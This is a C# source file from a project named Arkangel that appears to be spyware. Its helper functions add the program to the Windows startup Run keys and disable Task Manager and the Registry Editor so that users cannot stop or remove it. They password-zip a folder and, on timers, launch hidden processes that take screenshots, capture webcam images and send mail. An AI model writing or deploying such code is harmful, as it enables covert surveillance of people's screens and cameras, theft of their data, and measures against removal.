using Ionic.Zip;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Timers;

namespace Arkangel
{
    public static class Functions
    {
        public static void AddApplicationToCurrentUserStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("Arkangle", "\"" + System.Reflection.Assembly.GetExecutingAssembly().Location + "\"");
            }
        }

        public static void AddApplicationToAllUserStartup()
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("Arkangle", "\"" + System.Reflection.Assembly.GetExecutingAssembly().Location + "\"");
            }
        }

        public static void RemoveApplicationFromCurrentUserStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.DeleteValue("Arkangle", false);
            }
        }

        public static void RemoveApplicationFromAllUserStartup()
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.DeleteValue("Arkangle", false);
            }
        }

        public static bool IsUserAdministrator()
        {
            //bool value to hold our return value
            bool isAdmin;
            try
            {
                //get the currently logged in user
                WindowsIdentity user = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(user);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (UnauthorizedAccessException ex)
            {
                isAdmin = false;
            }
            catch (Exception ex)
            {
                isAdmin = false;
            }
            return isAdmin;
        }

        /// <summary>
        /// Disable or enable task manager. need to restart to confirm
        /// </summary>
        /// <param name="enable"></param> if enable = true => delete registry and restart
        public static void SetTaskManager(bool enable)
        {
            if (enable == true)
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
                {
                    key.SetValue("DisableTaskMgr", "0", RegistryValueKind.DWord);
                }
            else
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
                {
                    key.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
                }

        }

        // edit group policy to disable Registry editor
        public static void PreventAccessRegistryEditor(bool enable)
        {
            if (enable == true)
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
                {
                    key.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
                }
            else
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
                {
                    key.SetValue("DisableRegistryTools", "0", RegistryValueKind.DWord);
                }
            //ComputerGroupPolicyObject.SetPolicySetting(@"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System!DisableRegistryTools", "0", RegistryValueKind.DWord);
        }

        public static void ZipFolder(string dir, string password)
        {
            using (ZipFile zip = new ZipFile())
            {
                if (Directory.Exists(dir))
                {
                    zip.Password = password;
                    zip.AddDirectory(dir+"\\");
                    zip.Save(dir + ".zip");
                }
            }
        }

        // Timer for screenshot
        public static void SetTimerScreenShot(int _time)
        {
            // Create a timer with a two second interval.
            MainWindow.aTimer_scrshot = new System.Timers.Timer(_time);
            // Hook up the Elapsed event for the timer. 
            MainWindow.aTimer_scrshot.Elapsed += OnTimedEventScreenShot;
            MainWindow.aTimer_scrshot.AutoReset = true;
            MainWindow.aTimer_scrshot.Enabled = true;
        }
        public static void OnTimedEventScreenShot(Object source, ElapsedEventArgs e)
        {
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "screenshot.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
        }

        // Timer for Webcam
        public static void SetTimerWebcam(int _time)
        {
            // Create a timer with a two second interval.
            MainWindow.aTimer_webcam = new System.Timers.Timer(_time);
            // Hook up the Elapsed event for the timer. 
            MainWindow.aTimer_webcam.Elapsed += OnTimedEventWebcam;
            MainWindow.aTimer_webcam.AutoReset = true;
            MainWindow.aTimer_webcam.Enabled = true;
        }
        public static void OnTimedEventWebcam(Object source, ElapsedEventArgs e)
        {
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "webcam.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
        }

        // Timer for Send mail
        public static void SetTimerSendMail(int _time)
        {
            // Create a timer with a two second interval.
            MainWindow.aTimer_sendMail = new System.Timers.Timer(_time);
            // Hook up the Elapsed event for the timer. 
            MainWindow.aTimer_sendMail.Elapsed += OnTimedEventSendMail;
            MainWindow.aTimer_sendMail.AutoReset = true;
            MainWindow.aTimer_sendMail.Enabled = true;
        }
        public static void OnTimedEventSendMail(Object source, ElapsedEventArgs e)
        {
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "sendMail.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
        }
    }
}
